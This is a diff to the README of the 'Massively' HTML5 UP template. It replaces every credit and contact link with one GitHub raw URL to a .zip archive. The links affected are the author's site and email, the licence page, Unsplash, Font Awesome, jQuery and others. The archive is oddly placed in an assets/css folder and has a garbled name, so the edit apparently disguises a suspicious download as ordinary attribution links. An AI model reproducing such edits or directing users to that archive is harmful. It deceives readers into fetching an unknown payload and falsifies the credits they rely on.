@@ -1,6 +1,6 @@
 Massively by HTML5 UP
-html5up.net | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
 
 
 This is Massively, a text-heavy, article-oriented design built around a huge background
@@ -15,18 +15,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-aj@lkn.io | @ajlkn
+https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (unsplash.com)
+		Unsplash (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
 
 	Icons:
-		Font Awesome (fontawesome.io)
+		Font Awesome (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
 
 	Other:
-		jQuery (jquery.com)
-		Scrollex (github.com/ajlkn/jquery.scrollex)
-		Responsive Tools (github.com/ajlkn/responsive-tools)
+		jQuery (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
+		Scrollex (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
+		Responsive Tools (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
